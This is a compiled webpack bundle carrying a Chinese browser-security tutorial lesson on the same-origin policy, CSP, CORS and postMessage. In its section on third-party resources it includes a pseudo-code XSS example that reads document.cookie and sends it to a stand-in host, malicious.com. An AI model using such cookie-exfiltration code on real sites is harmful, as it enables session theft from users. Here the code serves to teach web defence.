"use strict";(self.webpackChunkmyblog=self.webpackChunkmyblog||[]).push([[57317],{63152:(e,t,n)=>{n.r(t),n.d(t,{default:()=>i});var a=n(60329);const s=[(0,a.uE)('<h1 id="同源策略-为什么xmlhttprequst不能跨域请求资源" tabindex="-1"><a class="header-anchor" href="#同源策略-为什么xmlhttprequst不能跨域请求资源" aria-hidden="true">#</a> 同源策略：为什么XMLHttpRequst不能跨域请求资源</h1><p>通过前面 6 个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的 5 篇文章，我们就来系统地介绍下浏览器安全相关的内容。</p><p>浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。</p><p>今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web 世界会是什么样子的呢？</p><p>Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。</p><p>Web 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。</p><p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p><ul><li>修改银行站点的 DOM、CSSOM 等信息；</li><li>在银行站点内部插入 JavaScript 脚本；</li><li>劫持用户登录的用户名和密码；</li><li>读取银行站点的 Cookie、IndexDB 等数据；</li><li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li></ul><p>所以说，在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全。</p><p>这就引出了页面中最基础、最核心的安全策略：同源策略（Same-origin policy）。</p><h2 id="什么是同源策略" tabindex="-1"><a class="header-anchor" href="#什么是同源策略" aria-hidden="true">#</a> 什么是同源策略</h2><p>要了解什么是同源策略，我们得先来看看什么是同源。</p><p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 time.geekbang.org，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>https://time.geekbang.org/?category=1\nhttps://time.geekbang.org/?category=0\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p><p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p><p><strong>第一个，DOM 层面</strong>。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p><p><strong>第二个，数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据</strong>。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。你可以自己试一下，这里我们就不做演示了。</p><p><strong>第三个，网络层面</strong>。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。你还记得在《17 | WebAPI：XMLHttpRequest 是怎么实现的？》这篇文章的末尾分析的 XMLHttpRequest 在使用过程中所遇到的坑吗？其中第一个坑就是在默认情况下不能访问跨域的资源。</p><h2 id="安全和便利性的权衡" tabindex="-1"><a class="header-anchor" href="#安全和便利性的权衡" aria-hidden="true">#</a> 安全和便利性的权衡</h2><p>我们了解了同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p><p>不过安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这也会使得 Web 项目难以开发和使用。因此我们就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击，这两种攻击我们会在后续两篇文章中再做介绍，本文我们只聊浏览器出让了同源策略的哪些安全性。</p><h3 id="_1-页面中可以嵌入第三方资源" tabindex="-1"><a class="header-anchor" href="#_1-页面中可以嵌入第三方资源" aria-hidden="true">#</a> 1. 页面中可以嵌入第三方资源</h3><p>我们在文章开头提到过，Web 世界是开放的，可以接入任何资源，而同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这无疑违背了 Web 的初衷，也带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此我们就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。</p><p>所以最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。</p><p>比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码</p><p><img src="https://blog.poetries.top/img/static/gitee/2019/11/92.png" alt=""></p><p>当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。</p><p>除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：</p><div class="language-javascript ext-js line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\n  <span class="token keyword">let</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://malicious.com?cookie = </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>document<span class="token punctuation">.</span>cookie<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>\n  <span class="token function">open</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>\n<span class="token punctuation">}</span>\n<span class="token function">onClick</span><span class="token punctuation">(</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。</p><p>以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。</p><h3 id="_2-跨域资源共享和跨文档消息机制" tabindex="-1"><a class="header-anchor" href="#_2-跨域资源共享和跨文档消息机制" aria-hidden="true">#</a> 2. 跨域资源共享和跨文档消息机制</h3><p>默认情况下，如果打开极客邦的官网页面，在官网页面中通过 XMLHttpRequest 或者 Fetch 来请求 InfoQ 中的资源，这时同源策略会阻止其向 InfoQ 发出请求，这样会大大制约我们的生产力。</p><p>为了解决这个问题，我们引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。</p><p>在介绍同源策略时，我们说明了如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。</p><h2 id="总结" tabindex="-1"><a class="header-anchor" href="#总结" aria-hidden="true">#</a> 总结</h2><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>同源策略会隔离不同源的 DOM、页面数据和网络通信，进而实现 Web 页面的安全性。</p><p>不过鱼和熊掌不可兼得，要绝对的安全就要牺牲掉便利性，因此我们要在这二者之间做权衡，找到中间的一个平衡点，也就是目前的页面安全策略原型。总结起来，它具备以下三个特点：</p><p>页面中可以引用第三方资源，不过这也暴露了很多诸如 XSS 的安全问题，因此又在这种开放的基础之上引入了 CSP 来限制其自由程度。 使用 XMLHttpRequest 和 Fetch 都是无法直接进行跨域请求的，因此浏览器又在这种严格策略的基础之上引入了跨域资源共享策略，让其可以安全地进行跨域操作。 两个不同源的 DOM 是不能相互操纵的，因此，浏览器中又实现了跨文档消息机制，让其可以比较安全地通信</p>',41)],p={},i=(0,n(13860).Z)(p,[["render",function(e,t){return(0,a.wg)(),(0,a.iD)("div",null,s)}]])},13860:(e,t)=>{t.Z=(e,t)=>{const n=e.__vccOpts||e;for(const[e,a]of t)n[e]=a;return n}},60831:(e,t,n)=>{n.r(t),n.d(t,{data:()=>a});const a=JSON.parse('{"key":"v-5545cce0","path":"/bedstone/browser-working-principle/part6/lesson32.html","title":"同源策略：为什么XMLHttpRequst不能跨域请求资源","lang":"zh-CN","frontmatter":{"sidebarDepth":3,"pageClass":"custom-code-highlight","summary":"同源策略：为什么XMLHttpRequst不能跨域请求资源 通过前面 6 个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的 5 篇文章，我们就来系统地介绍下浏览器安全相关的内容。 浏览器安全可以分为三大块——Web 页面安全、浏览器","head":[["meta",{"property":"og:url","content":"https://0808200.xyz/bedstone/browser-working-principle/part6/lesson32.html"}],["meta",{"property":"og:site_name","content":"𝑀𝑟.𝑔𝑜𝑜𝑔𝑥ℎ"}],["meta",{"property":"og:title","content":"同源策略：为什么XMLHttpRequst不能跨域请求资源"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:updated_time","content":"2022-12-29T09:56:01.000Z"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"article:modified_time","content":"2022-12-29T09:56:01.000Z"}]]},"excerpt":"","headers":[{"level":2,"title":"什么是同源策略","slug":"什么是同源策略","children":[]},{"level":2,"title":"安全和便利性的权衡","slug":"安全和便利性的权衡","children":[{"level":3,"title":"1. 页面中可以嵌入第三方资源","slug":"_1-页面中可以嵌入第三方资源","children":[]},{"level":3,"title":"2. 跨域资源共享和跨文档消息机制","slug":"_2-跨域资源共享和跨文档消息机制","children":[]}]},{"level":2,"title":"总结","slug":"总结","children":[]}],"git":{"createdTime":1672307761000,"updatedTime":1672307761000,"contributors":[{"name":"googxh","email":"gxh522@qq.com","commits":1}]},"readingTime":{"minutes":8.05,"words":2414},"filePathRelative":"bedstone/browser-working-principle/part6/lesson32.md","localizedDate":"2022年12月29日"}')}}]);